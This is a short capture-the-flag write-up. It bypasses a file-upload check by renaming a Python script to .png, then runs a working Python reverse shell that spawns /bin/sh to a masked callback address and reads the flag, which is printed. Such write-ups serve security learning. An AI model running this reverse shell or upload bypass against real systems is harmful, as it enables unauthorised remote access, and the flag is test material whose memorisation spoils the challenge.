Give me the file, and I will return the Running results by python to you!

```
print("hello world")
改文件后缀为png后上传
可以看到文件正确执行，尝试反弹shell

file uploaded successfully!<!-- hello world -->

```


```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("127.0.0.1",443)) #反弹地址加密处理
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```
cat /flag
flag{59474feaba6f4231a1195db6532b85fd}